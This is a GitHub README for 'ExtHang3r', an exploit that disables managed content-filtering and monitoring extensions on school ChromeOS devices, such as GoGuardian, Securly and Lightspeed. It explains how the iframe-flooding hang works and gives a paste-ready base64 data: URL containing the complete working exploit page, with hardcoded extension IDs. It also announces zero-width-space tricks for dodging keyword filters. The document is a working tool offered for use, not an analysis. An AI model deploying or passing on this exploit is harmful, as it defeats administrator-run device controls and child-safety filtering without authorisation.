# ExtHang3r

## What is it?
ExtHang3r is an exploit created by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a> that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of October 2024.

## How does it work?
This exploit works very similar to <b>Dextensify</b>. The main difference being that instead of creating iframes and slowly getting rid of them, a separate popup window is created that spams iframes and refreshes them. After a few seconds, the popup is closed achieving similar behavior to the <b>LTMEAT Flood</b> method. This worked great in paper, but for whatever reason this hang just woudn't let you disable the extension with the file URLs switch. It would instead just restart the extension. However, a solution was quickly found and it was as simple as just attempting to load any of the extension's pages prior to flipping the switch.

### What extensions are supported?
* Securly
* Securly (old)
* GoGuardian
* LANSchool
* Linewize
* Blocksi
* FortiGuard
* Cisco Umbrella
* ContentKeeper
* Securly Classroom
* CK-Authenticator G3
* Hapara
* iBoss
* Lightspeed Filter Agent
* Lightspeed Classroom
* InterCLASS Filtering Service
* InterSafe GatewayConnection Agent
* LoiLo Web Filters
* Gopher Buddy
* LanSchool Web Helper
* IMTLazarus
* Impero Backdrop
* Mobile Guardian
And extensions in this newer version such as:
* Aristotle Student

## How do I use it?
To use the exploit, paste the following url into your url bar. More detailed instructions are provided in the exploit's page.
```
data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICA8dGl0bGU+RXh0SGFuZzNyPC90aXRsZT4KICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb2JieS1Cb2kvRXh0SGFuZzNyL21haW4vZmF2aWNvbi5wbmciPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1WYXJlbGErUm91bmQmZGlzcGxheT1zd2FwIj4KICA8c3R5bGU+CiAgICBib2R5IHsKICAgICAgZm9udC1mYW1pbHk6ICdWYXJlbGEgUm91bmQnLCBzYW5zLXNlcmlmOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmOGY5ZmE7CiAgICAgIGNvbG9yOiAjMzMzOwogICAgfQogICAgaGVhZGVyIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzM0M2E0MDsKICAgICAgY29sb3I6ICNmZmY7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBkaXNwbGF5OiBmbGV4OwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgYm94LXNoYWRvdzogMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgIH0KICAgIC5sb2dvIHsKICAgICAgd2lkdGg6IDUwcHg7CiAgICAgIGhlaWdodDogNTBweDsKICAgICAgbWFyZ2luLXJpZ2h0OiAxMHB4OwogICAgfQogICAgLmNvbnRhaW5lciB7CiAgICAgIG1heC13aWR0aDogODAwcHg7CiAgICAgIG1hcmdpbjogMTUwcHggYXV0byAwIGF1dG87CiAgICAgIHBhZGRpbmc6IDIwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZDogI2ZmZjsKICAgICAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgfQogICAgc2VsZWN0IHsKICAgICAgZm9udC1mYW1pbHk6ICdWYXJlbGEgUm91bmQnLCBzYW5zLXNlcmlmOwogICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICBwYWRkaW5nOiAxMHB4OwogICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjZWQ0ZGE7CiAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICB9CiAgICBidXR0b24gewogICAgICBmb250LWZhbWlseTogJ1ZhcmVsYSBSb3VuZCcsIHNhbnMtc2VyaWY7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7CiAgICAgIGNvbG9yOiAjZmZmOwogICAgICBib3JkZXI6IG5vbmU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgZm9udC1zaXplOiAxNnB4OwogICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgbWFyZ2luLXRvcDogMTBweDsKICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2U7CiAgICB9CiAgICBidXR0b246aG92ZXIgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1NmIzOwogICAgfQogICAgLm92ZXJsYXkgewogICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgIHRvcDogMDsKICAgICAgbGVmdDogMDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIGhlaWdodDogMTAwJTsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLCAwLCAwLCAwLjcpOwogICAgICBkaXNwbGF5OiBub25lOwogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgei1pbmRleDogOTk5OTsKICAgICAgY29sb3I6ICNmZmY7CiAgICAgIGZvbnQtc2l6ZTogMjRweDsKICAgICAgdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICB9CiAgICAuc3Bpbm5lciB7CiAgICAgIGJvcmRlcjogNnB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsKICAgICAgYm9yZGVyLXRvcDogNnB4IHNvbGlkICNmZmY7CiAgICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgd2lkdGg6IDQwcHg7CiAgICAgIGhlaWdodDogNDBweDsKICAgICAgYW5pbWF0aW9uOiBzcGluIDFzIGxpbmVhciBpbmZpbml0ZTsKICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgIH0KICAgIEBrZXlmcmFtZXMgc3BpbiB7CiAgICAgIDAlIHsgdHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7IH0KICAgICAgMTAwJSB7IHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7IH0KICAgIH0KICAgICNraWxsRXh0ZW5zaW9uVGV4dCB7CiAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgIGNvbG9yOiAjMzMzOwogICAgICBmb250LXNpemU6IDE4cHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZDogI2U5ZWNlZjsKICAgICAgcGFkZGluZzogMjBweDsKICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICBib3gtc2hhZG93OiAwIDRweCA4cHggcmdiYSgwLCAwLCAwLCAwLjEpOwogICAgfQogICAJICNraWxsQnV0dG9uIHsKCSAgZGlzcGxheTogbm9uZTsKCSAgYmFja2dyb3VuZC1jb2xvcjogI2RjMzU0NTsKCSAgY29sb3I6ICNmZmY7CgkgIGJvcmRlcjogbm9uZTsKCSAgcGFkZGluZzogMTBweCAyMHB4OwoJICBmb250LXNpemU6IDE2cHg7CgkgIGN1cnNvcjogcG9pbnRlcjsKCSAgYm9yZGVyLXJhZGl1czogNXB4OwogCSAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2U7Cgl9CgoJI2tpbGxCdXR0b246aG92ZXIgewoJICBiYWNrZ3JvdW5kLWNvbG9yOiAjOWMxYzI4OwoJfQogICAgZm9vdGVyIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzM0M2E0MDsKICAgICAgY29sb3I6ICNmZmY7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgcGFkZGluZzogMTBweDsKICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICBib3R0b206IDA7CiAgICAgIHdpZHRoOiAxMDAlOwogICAgfQogICAgZm9vdGVyIGEgewogICAgICBjb2xvcjogIzAwN2JmZjsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgfQogICAgZm9vdGVyIGE6aG92ZXIgewogICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgoKPGhlYWRlcj4KICA8aW1nIHNyYz0iaHR0cHM6Ly9ibG9iYnktYm9pLmdpdGh1Yi5pby9CbG9iYnlwYXNzWFNTL2Zhdmljb24ucG5nIiBhbHQ9IkxvZ28iIGNsYXNzPSJsb2dvIj4KICA8aDE+RXh0SGFuZzNyPC9oMT4KPC9oZWFkZXI+Cgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogIDxwPkV4dEhhbmczciBpcyBhbiBleHBsb2l0IHRoYXQgYWxsb3dzIENocm9tZU9TIHVzZXJzIHRvIGtpbGwgbWFuYWdlZCBleHRlbnNpb25zIGFmdGVyIHRoZSBMVE1FQVQgcGF0Y2guIEl0IHJlbWFpbnMgdW5wYXRjaGVkIGluIGFsbCBuZXcgQ2hyb21lT1MgdmVyc2lvbnMgYXMgb2YgU2VwdGVtYmVyIDIwMjQuPC9wPgogIDxsYWJlbCBmb3I9ImlmcmFtZVNlbGVjdCIgaWQ9ImxhYmVsRm9ySWZyYW1lU2VsZWN0Ij5TZWxlY3QgZXh0ZW5zaW9uOjwvbGFiZWw+CiAgPHNlbGVjdCBpZD0iaWZyYW1lU2VsZWN0Ij4KICA8L3NlbGVjdD4KICA8YnV0dG9uIG9uY2xpY2s9Indhcm5pbmcoKTsiIGlkPSJoYW5nQnV0dG9uIj5IYW5nIEV4dGVuc2lvbiE8L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJraWxsQnV0dG9uIiBvbmNsaWNrPSJvcGVuRXh0ZW5zaW9uUG9wdXAoKTsiPktpbGwgRXh0ZW5zaW9uITwvYnV0dG9uPgo8L2Rpdj4KCjxkaXYgY2xhc3M9Im92ZXJsYXkiIGlkPSJvdmVybGF5Ij4KICA8ZGl2IGNsYXNzPSJzcGlubmVyIj48L2Rpdj4KICBIYW5naW5nLi4uIChUaGlzIHdpbGwgdGFrZSBhYm91dCAxIG1pbnV0ZSkKPC9kaXY+CjxkaXYgaWQ9ImtpbGxFeHRlbnNpb25UZXh0Ij48L2Rpdj4KCjxmb290ZXI+CiAgPHA+TWFkZSBieSA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vQmxvYmJ5LUJvaS8iPkJsb2JieSBCb2k8L2E+PC9wPgo8L2Zvb3Rlcj4KCjxzY3JpcHQ+CiAgYXN5bmMgZnVuY3Rpb24gY2hlY2tFeHRlbnNpb25VUkwodXJsKSB7CiAgICB0cnkgewogICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKHVybCk7CiAgICAgIGlmIChyZXNwb25zZS5vaykgewogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogIH0KCiAgYXN5bmMgZnVuY3Rpb24gcG9wdWxhdGVTZWxlY3RPcHRpb25zKCkgewogICAgY29uc3Qgc2VsZWN0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpZnJhbWVTZWxlY3QiKTsKICAgIGNvbnN0IGV4dGVuc2lvbnMgPSB7CiAgICAgICJTZWN1cmx5IjogImNocm9tZS1leHRlbnNpb246Ly9qb2ZsbWtjY2lia29vcGxhZW9pbmVjamJtZGViZ2xhYi9mb250cy9NZXRyb3BvbGlzLmNzcyIsCiAgICAgICJTZWN1cmx5IChvbGQpIjogImNocm9tZS1leHRlbnNpb246Ly9paGVvYmFnamtma2xubGlrZ2loYW5saGNkZGpvaWhrZy9mb250cy9NZXRyb3BvbGlzLmNzcyIsCiAgICAgICJHb0d1YXJkaWFuIjogImNocm9tZS1leHRlbnNpb246Ly9oYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaC95b3V0dWJlX2luamVjdGlvbi5qcyIsCiAgICAgICJMQU5TY2hvb2wiOiAiY2hyb21lLWV4dGVuc2lvbjovL2JhbGVpb2puanBnZW9qb2hoaGZiaWNoY29kZ2xqbW5qL2Jsb2NrZWQuaHRtbCIsCiAgICAgICJMaW5ld2l6ZSI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vZGRmYmtocG1jZGJjaWVqZW5mY29sYWFpZWJuamNiZmMvYmFja2dyb3VuZC9hc3NldHMvcGFnZXMvZGVmYXVsdC1ibG9ja2VkLmh0bWwiLAogICAgICAiQmxvY2tzaSI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vZ2hscG1sZG1qamhtZGdtbmVvYWliYmVna2pqYm9uYmsvcGFnZXMvYmxvY2tQYWdlLmh0bWwiLAogICAgICAiRm9ydGlHdWFyZCI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vaWdiZ3BlaG5ibWhnZGdqYmhra3BlZG9tbWdtZmJlYW8veW91dHViZV9pbmplY3Rpb24uanMiLAogICAgICAiQ2lzY28gVW1icmVsbGEiOiAiY2hyb21lLWV4dGVuc2lvbjovL2pjZGhtb2pmZWNqZm1iZHBjaGloYmVpbG9oZ25iZGNpL2Jsb2NrZWQuaHRtbCIsCiAgICAgICJDb250ZW50S2VlcGVyIjogImNocm9tZS1leHRlbnNpb246Ly9qZG9ncGhha29uZGZkbWNhbnBhcGZhaGtkb21haWNmYS9pbWcvY2thdXRoMTl4LnBuZyIsCiAgICAgICJDSy1BdXRoZW50aWNhdG9yIEczIjogImNocm9tZS1leHRlbnNpb246Ly9vZG9hbnBub25pbG9nb2ZnZ2FvaGhrZGtkZ2JoZGxqcC9pbWcvY2thdXRoMTl4LnBuZyIsCiAgICAgICJTZWN1cmx5IENsYXNzcm9vbSI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vamZiZWNmbWllZ2NqZGRlbmpobGJobGlrY2JmbW5hZmQvbm90Zm91bmQuaHRtbCIsCiAgICAgICJIYXBhcmEiOiAiY2hyb21lLWV4dGVuc2lvbjovL2tib2hhZmNvcGZwaWdramRpbWRjZGdlbmxoa21oYm5jL2Jsb2NrZWQuaHRtbCIsCiAgICAgICJIYXBhcmEgKG5ldyBJRCkiOiAiY2hyb21lLWV4dGVuc2lvbjovL2FjZW9wYWNnYWVwZGNlbG9ob2JpY3BmZmJiZWpuZmFjL2Jsb2NrZWQuaHRtbCIsCiAgICAgICJpYm9zcyI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8va21mZmVoYmlkbGFsaWJmZWtsYWVmbmNrcGlkYm9kZmYvcmVzdHJpY3RlZC5odG1sIiwKICAgICAgIkxpZ2h0c3BlZWQgRmlsdGVyIEFnZW50IjogImNocm9tZS1leHRlbnNpb246Ly9hZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbS9pY29uLTEyOC5wbmciLAogICAgICAiTGlnaHRzcGVlZCBDbGFzc3Jvb20iOiAiY2hyb21lLWV4dGVuc2lvbjovL2trYm1kZ2pnZ2NkYWpja2RsYm5nZGpvbnBjaHBhaWVhL2Fzc2V0cy9pY29uLWNsYXNzcm9vbS0xMjgucG5nIiwKICAgICAgIkludGVyQ0xBU1MgRmlsdGVyaW5nIFNlcnZpY2UiOiAiY2hyb21lLWV4dGVuc2lvbjovL2piZGRnamdsZ2trbmVvbm5pbmVhb2hkaGFiamJnb3BpL3BhZ2VzL21lc3NhZ2UtcGFnZS5odG1sIiwKICAgICAgIkludGVyU2FmZSBHYXRld2F5Q29ubmVjdGlvbiBBZ2VudCI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vZWNqb2doY2NuamxvZGpsbWtnbW5ibmtkY2JuamdkZW4vcmVzb3VyY2VzL29wdGlvbnMuanMiLAogICAgICAiTG9pTG8gV2ViIEZpbHRlcnMiOiAiY2hyb21lLWV4dGVuc2lvbjovL3BhYmpsYmpjZ2xkbmRucGpub2tqYWtiZG9mamduZmlhL2ltYWdlL2FsbG93X2ljb24vc2hpZWxkX2dyZWVuXzEyOHgxMjgucG5nIiwKICAgICAgIkdvcGhlciBCdWRkeSI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vY2diYmJqbWdkcG5pZmlqY29uaGFtZ2dqZWhsYW1jaWYvaW1hZ2VzL2dvcGhlci1idWRkeV8xMjh4MTI4X2NvbG9yLnBuZyIsCiAgICAgICJMYW5TY2hvb2wgV2ViIEhlbHBlciI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vaG9uamNuZWZla2Zub21wYW1wY3BtY2RhZGlibWpobGsvYmxvY2tlZC5odG1sIiwKICAgICAgIklNVExhemFydXMiOiAiY2hyb21lLWV4dGVuc2lvbjovL2NnaWdvcGpha2tlY2xoZ2djaGduaG1wbWhnaGNibmFmL21vZGVscy9tb2RlbC5qc29uIiwKICAgICAgIkltcGVybyBCYWNrZHJvcCI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vampwbWpjY3BlbWxsbm1naWFvamFvY2duYWtwbWZnamcvbGljZW5zZXMuaHRtbCIsCiAgICAgICJNb2JpbGUgR3VhcmRpYW4iOiAiY2hyb21lLWV4dGVuc2lvbjovL2ZnbWFmaGRvaGprZGhmYWFjZ2JnY2xtZmdrZ29rZ21iL2Jsb2NrLmh0bWwiCiAgICAgICJBcmlzdG90bGUgU3R1ZGVudCI6ICJjaHJvbWUtZXh0ZW5zaW9uOi8vY2ZuZWJhY29pbHBiaWtqZ2Fnb25uanBvZWlqZG5jamUvcGFnZXMvYmxvY2tQYWdlLmh0bWwiCiAgICB9OwogICAgCiAgICBsZXQgaGFzU3VwcG9ydGVkRXh0ZW5zaW9ucyA9IGZhbHNlOwoKICAgIGZvciAoY29uc3QgW25hbWUsIHVybF0gb2YgT2JqZWN0LmVudHJpZXMoZXh0ZW5zaW9ucykpIHsKICAgICAgaWYgKGF3YWl0IGNoZWNrRXh0ZW5zaW9uVVJMKHVybCkpIHsKICAgICAgICBjb25zdCBvcHRpb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKICAgICAgICBvcHRpb24udmFsdWUgPSB1cmw7CiAgICAgICAgb3B0aW9uLnRleHRDb250ZW50ID0gbmFtZTsKICAgICAgICBzZWxlY3RFbGVtZW50LmFwcGVuZENoaWxkKG9wdGlvbik7CiAgICAgICAgaGFzU3VwcG9ydGVkRXh0ZW5zaW9ucyA9IHRydWU7CiAgICAgIH0KICAgIH0KICAgIAogICAgaWYgKCFoYXNTdXBwb3J0ZWRFeHRlbnNpb25zKSB7CiAgICAgIGNvbnN0IG9wdGlvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwogICAgICBvcHRpb24udmFsdWUgPSAiIjsKICAgICAgb3B0aW9uLnRleHRDb250ZW50ID0gIk5vIHN1cHBvcnRlZCBleHRlbnNpb25zIGluc3RhbGxlZCI7CiAgICAgIHNlbGVjdEVsZW1lbnQuYXBwZW5kQ2hpbGQob3B0aW9uKTsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhbmdCdXR0b24iKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfQogIH0KCiAgcG9wdWxhdGVTZWxlY3RPcHRpb25zKCk7CiAgCiAgZnVuY3Rpb24gcmVwbGFjZUlmcmFtZXMoY29udGFpbmVyLCBpZnJhbWVTcmMpIHsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgMTAwMDsgaSsrKSB7CiAgICAgIHZhciBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKICAgICAgaWZyYW1lLnNyYyA9IGlmcmFtZVNyYzsKICAgICAgaWZyYW1lLnN0eWxlLndpZHRoID0gJzEwMCUnOwogICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICB9CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB3aGlsZSAoY29udGFpbmVyLmZpcnN0Q2hpbGQpIHsKICAgICAgICBjb250YWluZXIucmVtb3ZlQ2hpbGQoY29udGFpbmVyLmZpcnN0Q2hpbGQpOwogICAgICB9CiAgICAgIHJlcGxhY2VJZnJhbWVzKGNvbnRhaW5lciwgaWZyYW1lU3JjKTsKICAgIH0sIDUpOwogIH0KCiAgZnVuY3Rpb24gd2FybmluZygpIHsKICAgIHZhciBvdmVybGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm92ZXJsYXkiKTsKICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIHZhciBpZnJhbWVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaWZyYW1lU2VsZWN0Iik7CiAgICB2YXIgc2VsZWN0ZWRPcHRpb24gPSBpZnJhbWVTZWxlY3Qub3B0aW9uc1tpZnJhbWVTZWxlY3Quc2VsZWN0ZWRJbmRleF0udGV4dDsKICAgIHZhciBzZWxlY3RlZFNyYyA9IGlmcmFtZVNlbGVjdC52YWx1ZTsKICAgIHZhciBwb3B1cCA9IHdpbmRvdy5vcGVuKCIiLCAiUG9wdXBXaW5kb3ciLCAid2lkdGg9MTAwLGhlaWdodD0xMDAiKTsKICAgIHZhciBwb3B1cERvY3VtZW50ID0gcG9wdXAuZG9jdW1lbnQ7CiAgICB2YXIgcG9wdXBCb2R5ID0gcG9wdXBEb2N1bWVudC5ib2R5OwogICAgdmFyIGlmcmFtZUNvbnRhaW5lciA9IHBvcHVwRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBpZnJhbWVDb250YWluZXIuaWQgPSAnaWZyYW1lQ29udGFpbmVyJzsKICAgIHBvcHVwQm9keS5hcHBlbmRDaGlsZChpZnJhbWVDb250YWluZXIpOwogICAgcmVwbGFjZUlmcmFtZXMoaWZyYW1lQ29udGFpbmVyLCBzZWxlY3RlZFNyYyk7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBwb3B1cC5jbG9zZSgpOwogICAgICB2YXIgZXh0ZW5zaW9uSWQgPSBzZWxlY3RlZFNyYy5zdWJzdHJpbmcoc2VsZWN0ZWRTcmMuaW5kZXhPZigiLy8iKSArIDIsIHNlbGVjdGVkU3JjLmluZGV4T2YoIi8iLCBzZWxlY3RlZFNyYy5pbmRleE9mKCIvLyIpICsgMikpOwogICAgICB2YXIgZXh0ZW5zaW9uVVJMID0gImNocm9tZS1leHRlbnNpb246Ly8iICsgZXh0ZW5zaW9uSWQ7CiAgICAgIHZhciBraWxsRXh0ZW5zaW9uVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJraWxsRXh0ZW5zaW9uVGV4dCIpOwogICAgICBraWxsRXh0ZW5zaW9uVGV4dC5pbm5lckhUTUwgPSAiTm93IHRoYXQgdGhlIGV4dGVuc2lvbiA8c3Ryb25nPiIgKyBzZWxlY3RlZE9wdGlvbiArICI8L3N0cm9uZz4gaGFzIGJlZW4gaGFuZ2VkLCBwcmVzcyB0aGUgYnV0dG9uIGFib3ZlLiI7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIGtpbGxFeHRlbnNpb25UZXh0LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJraWxsQnV0dG9uIikuc3R5bGUuZGlzcGxheSA9ICJpbmxpbmUtYmxvY2siOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYW5nQnV0dG9uIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpZnJhbWVTZWxlY3QiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImxhYmVsRm9ySWZyYW1lU2VsZWN0Iikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgia2lsbEJ1dHRvbiIpLnNldEF0dHJpYnV0ZSgiZGF0YS11cmwiLCBzZWxlY3RlZFNyYyk7CiAgICAgIH0sIDEwMDAwKTsKICAgIH0sIDUwMDApOwogIH0KCiAgZnVuY3Rpb24gb3BlbkV4dGVuc2lvblBvcHVwKCkgewogICAgdmFyIHNlbGVjdGVkU3JjID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImtpbGxCdXR0b24iKS5nZXRBdHRyaWJ1dGUoImRhdGEtdXJsIik7CiAgICB2YXIgZXh0ZW5zaW9uSWQgPSBzZWxlY3RlZFNyYy5zdWJzdHJpbmcoc2VsZWN0ZWRTcmMuaW5kZXhPZigiLy8iKSArIDIsIHNlbGVjdGVkU3JjLmluZGV4T2YoIi8iLCBzZWxlY3RlZFNyYy5pbmRleE9mKCIvLyIpICsgMikpOwogICAgdmFyIGtpbGxFeHRlbnNpb25UZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImtpbGxFeHRlbnNpb25UZXh0Iik7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgia2lsbEJ1dHRvbiIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBraWxsRXh0ZW5zaW9uVGV4dC5pbm5lckhUTUwgPSAiTWFrZSBzdXJlIHRvIGtlZXAgdGhpcyB0YWIgb3Blbi4gVGhlbiBpbiBhIG5ldyB0YWIgb3BlbiA8c3Ryb25nPmNocm9tZTovL2V4dGVuc2lvbnMvP2lkPSIgKyBleHRlbnNpb25JZCArICI8L3N0cm9uZz4gRmxpcCB0aGUgc3dpdGNoIGNhbGxlZCBhbGxvdyBhY2Nlc3MgdG8gZmlsZSBVUkxzIHR3aWNlLiBUaGUgZXh0ZW5zaW9uIHdhcyBzdWNjZXNzZnVsbHkga2lsbGVkISBOb3cgeW91IGNhbiBjbG9zZSB0aGF0IHRhYiBhcyB3ZWxsIGFzIHRoaXMgb25lLiBJZiB5b3Ugd2FudCB0byByZXN0b3JlIHRoZSBleHRlbnNpb24sIGZsaXAgdGhlIGFsbG93IGFjY2VzcyB0byBmaWxlIFVSTHMgc3dpdGNoIGFnYWluLiI7CiAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IHNlbGVjdGVkU3JjOwogIH0KPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo=
```
### Loading from local offline .html file
You can download index.html (from this repository). Once you downloaded it, open the Files app, navigate your way to Downloads, then double click index.html or drag index.html in the URL bar.

## What are the new enhancements?
There are many new enhancements in this version, such as:
* More extension IDs
* Using zero width spaces to bypass word restrictions (such as "unblock" being blocked) (soon)
* A randomly generated game to play while you wait, such as Pac-Man or Snake (soon)
